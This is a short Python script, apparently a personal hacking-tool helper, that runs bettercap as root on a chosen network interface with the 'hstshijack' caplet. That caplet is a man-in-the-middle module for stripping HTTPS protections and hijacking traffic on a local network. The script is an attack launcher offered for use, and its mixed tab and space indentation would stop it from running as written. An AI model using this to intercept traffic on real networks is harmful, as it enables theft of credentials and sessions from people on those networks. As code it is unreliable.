#!/usr/bin/env python3
import subprocess
import argparse

def enable_bettercap():
	parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--iface", dest="iface", help="Provide the interface to set iface to.")
    options = parser.parse_args()
	iface = options.iface

    if iface and isinstance(iface, str):
		# Do something if iface exists as a string
    	print("[+] Request, set bettercap iface to: " + iface)
		subprocess.call(["sudo", "bettercap", "-iface", iface, "-caplet", "hstshijack/hstshijack"])

    else:
		print("[-] Please provide an interface value for bettercap iface.")
		return


print("\n[+] Hello, this is enable_bettercap.  Keep smiling!")
enable_bettercap()